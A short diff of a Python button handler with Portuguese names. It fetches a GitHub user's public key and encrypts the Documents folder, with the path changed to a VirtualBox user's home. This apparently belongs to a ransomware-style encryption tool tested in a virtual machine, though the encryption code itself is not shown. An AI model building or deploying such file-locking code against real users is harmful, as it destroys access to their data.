@@ -7,7 +7,7 @@ from main import GITHUB_USER, encriptar_pasta, obter_chave_publica_github
 
 # --- Funções do App ---
 def acao_botao():
-    pasta = os.path.expanduser("~/Documentos")
+    pasta = os.path.expanduser("/home/vboxuser/Documentos")
     
     chave_pub = obter_chave_publica_github(GITHUB_USER)
     
